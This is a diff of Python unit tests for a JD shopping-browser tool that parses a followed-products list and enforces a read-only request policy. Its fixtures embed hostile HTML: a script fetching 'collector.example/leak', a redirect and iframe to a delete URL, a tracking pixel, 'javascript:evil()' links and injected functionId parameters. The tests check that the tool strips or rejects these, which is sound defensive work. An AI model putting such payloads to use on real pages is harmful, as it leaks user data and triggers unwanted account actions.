@@ -4,94 +4,75 @@ import time
 import unittest
 from types import SimpleNamespace
 from unittest.mock import AsyncMock, patch
-from urllib.parse import urlencode
 
 from jd_taobao_mcp.config import Settings
-from jd_taobao_mcp.followed import (FOLLOW_FUNCTION, follow_query_page, followed_request_allowed,
-                                   normalize_followed)
+from jd_taobao_mcp.followed import FOLLOW_URL, followed_document_url, normalize_followed
 from jd_taobao_mcp.safety import SafetyError, is_readable_url
 from jd_taobao_mcp.service import ShoppingBrowserService
 
 
-def query(page=1, **args):
-    """Build the observed query using fake public metadata only."""
-    return 'https://api.m.jd.com/api?' + urlencode({'functionId': FOLLOW_FUNCTION,
-        'body': json.dumps({'pageNo': page, 'pageSize': 20, 'source': 'pc_car_follow_product', **args})})
+def fixture(page=1, total=25):
+    """Generate only synthetic projected merchandise and explicit pager metadata."""
+    rows = [{'href': f'//item.jd.com/{1000+i}.html?tracking=FAKE_PRIVATE',
+             'title': f'Example product {i}', 'price_text': '¥20.50',
+             'account': 'FAKE_ACCOUNT', 'price': '9999.00'}
+            for i in range((page-1)*12, min(page*12, total))]
+    return {'total': total, 'page_size': 12, 'current_page': page,
+            'row_count': len(rows), 'items': rows}
 
 
-def fixture(page=1, total=21):
-    """Generate fake products with unrelated account fields that must be discarded."""
-    return {'success': True, 'content': [
-        {'skuId': str(1000+i), 'skuName': f'Example product {i}', 'jdPrice': '25.00',
-         'productPriceVO': {'finalPriceVO': {'estimatedPrice': '20.50', 'title': '到手价'}},
-         'account': 'FAKE_ACCOUNT', 'skuImage': 'https://private.example/FAKE_TOKEN'}
-        for i in range((page-1)*20, min(page*20, total))], 'pin': 'FAKE_ACCOUNT'}
+def html_fixture(page=1, total=25):
+    """Mirror the server-rendered list, including dangerous scripts and stale prices."""
+    rows = ''.join(f'<div class="mf-goods-item"><div class="p-name">'
+        f'<a href="{item["href"]}">{item["title"]}</a></div><div class="p-price">'
+        f'<strong price="9999.00" data-estimated-price="1.00">{item["price_text"]}</strong>'
+        '</div><a class="J-productUnfollow" href="https://t.jd.com/delete">Delete</a></div>'
+        for item in fixture(page, total)['items'])
+    return (rows + "<script>var pager = $('#paginationBottom').pager({"
+            + f"total:parseInt('{total}'),pageSize:12,currentPage:parseInt('{page}'),"
+            + "callback:function(){}});</script>"
+            + '<script>fetch("https://collector.example/leak");location.href="https://t.jd.com/delete";</script>'
+            + '<iframe src="https://t.jd.com/delete"></iframe><img src="https://collector.example/pixel">')
 
 
 class FollowedContractTests(unittest.TestCase):
-    def test_projection_preserves_price_labels_and_excludes_private_fields(self):
-        result = normalize_followed(fixture())
-        self.assertEqual(len(result['items']), 20)
+    def test_projection_excludes_private_fields_and_canonicalizes_links(self):
+        result = normalize_followed(fixture(), 1)
+        self.assertEqual(len(result['items']), 12)
         self.assertEqual(result['items'][0], {'title': 'Example product 0',
-            'product_url': 'https://item.jd.com/1000.html', 'price': 20.5, 'price_label': '到手价'})
+            'product_url': 'https://item.jd.com/1000.html', 'price': 20.5, 'price_label': '页面价格'})
         self.assertNotIn('FAKE_', json.dumps(result))
         self.assertFalse(result['partial'])
-        self.assertFalse(result['empty_page'])
+        self.assertEqual(result['reported_total'], 25)
 
-    def test_invalid_unknown_zero_and_base_prices_remain_distinct(self):
-        data = fixture(total=4)
-        rows = data['content']
-        rows[0]['productPriceVO']['finalPriceVO']['estimatedPrice'] = '0.00'
-        rows[1]['productPriceVO'] = None
-        rows[2].update(jdPrice='model 123', productPriceVO=[])
-        rows[3]['skuId'] = 'javascript:evil()'
-        result = normalize_followed(data)
-        self.assertEqual([r['price'] for r in result['items']], [0, 25, None])
-        self.assertEqual(result['items'][1]['price_label'], '京东价')
-        self.assertIsNone(result['items'][2]['price_label'])
+    def test_unknown_prices_never_use_historical_or_estimated_attributes(self):
+        data = fixture(total=3)
+        data['items'][0]['price_text'] = '¥暂无报价'
+        data['items'][1]['price_text'] = '¥0.00'
+        data['items'][2]['href'] = 'javascript:evil()'
+        result = normalize_followed(data, 1)
+        self.assertEqual([r['price'] for r in result['items']], [None, 0])
+        self.assertIsNone(result['items'][0]['price_label'])
         self.assertTrue(result['partial'])
-        self.assertFalse(result['empty_page'])
 
-    def test_errors_malformed_rows_and_empty_list_are_not_confused(self):
-        for payload in (None, {}, {'success': False}, {'success': True, 'content': None}):
-            self.assertFalse(normalize_followed(payload)['success'])
-        self.assertEqual(normalize_followed({'code': -14})['status'], 'login_required')
-        self.assertTrue(normalize_followed(fixture(total=0))['empty_page'])
-        result = normalize_followed({'success': True, 'content': [None, {}, False]})
-        self.assertTrue(result['partial'])
-        self.assertFalse(result['empty_page'])
+    def test_empty_malformed_or_wrong_page_responses_are_distinct(self):
+        self.assertTrue(normalize_followed(fixture(total=0), 1)['success'])
+        for data in (None, {}, {**fixture(), 'total': True}, {**fixture(), 'page_size': True},
+                     {**fixture(), 'current_page': 2}, {**fixture(), 'row_count': None}):
+            self.assertFalse(normalize_followed(data, 1)['success'])
+        data = fixture()
+        data['items'][0] = None
+        self.assertTrue(normalize_followed(data, 1)['partial'])
+        data = fixture(total=0)
+        data['total'] = 25
+        self.assertTrue(normalize_followed(data, 1)['partial'])
 
-    def test_query_rejects_mutations_filters_duplicates_and_unbounded_pagination(self):
-        self.assertEqual(follow_query_page(query()), 1)
-        for page in (0, 7, True, '1'):
-            self.assertIsNone(follow_query_page(query(page)))
-        for url in (query(tag=1), query(pageSize=True), query(source='other'),
-                    query().replace(FOLLOW_FUNCTION, 'pcCart_jc_follow'),
-                    query()+'&functionId=cancelFollow', query()+'&callback=execute',
-                    query()+'&body=%7B%7D', query().replace('api.m.jd.com', 'evil.example'),
-                    query().replace('/api?', '/other?'), query()+'#fragment'):
-            self.assertIsNone(follow_query_page(url))
-        for body in ('{"pageNo":1,"pageNo":2,"pageSize":20,"source":"pc_car_follow_product"}',
-                     '[["pageNo",1],["pageSize",20],["source","pc_car_follow_product"]]',
-                     '{"pageNo":[],"pageSize":20,"source":"pc_car_follow_product"}'):
-            self.assertIsNone(follow_query_page('https://api.m.jd.com/api?'+urlencode({
-                'functionId': FOLLOW_FUNCTION, 'body': body})))
-
-    def test_resource_policy_keeps_account_routes_and_writes_closed(self):
-        def allowed(url, method='GET', kind='fetch', main=True, body=''):
-            return followed_request_allowed(url, method=method, resource_type=kind,
-                main_document=main, page_number=1, post_data=body)
-        self.assertTrue(allowed(query()))
-        self.assertFalse(allowed(query(), method='POST'))
-        self.assertFalse(allowed(query(), body='functionId=unfollow'))
-        self.assertFalse(allowed(query(2)))
-        self.assertFalse(allowed(query(), kind='document'))
-        self.assertFalse(allowed('https://t.jd.com/follow/product', kind='document'))
-        self.assertFalse(is_readable_url('https://t.jd.com/home/follow'))
-        self.assertTrue(allowed('https://cart.jd.com/cart_index', kind='document'))
-        self.assertFalse(allowed('https://cart.jd.com/cart_index', kind='document', main=False))
-        self.assertTrue(allowed('https://storage.360buyimg.com/example.js', kind='script'))
-        self.assertFalse(allowed('https://collector.example/leak', kind='image'))
+    def test_only_fixed_bounded_document_urls_can_be_constructed(self):
+        self.assertEqual(followed_document_url(2), FOLLOW_URL+'?index=2')
+        self.assertFalse(is_readable_url(FOLLOW_URL))
+        for value in (0, 11, True, '1', 'https://t.jd.com/delete'):
+            with self.assertRaises(ValueError):
+                followed_document_url(value)
 
 
 class FollowedServiceTests(unittest.IsolatedAsyncioTestCase):
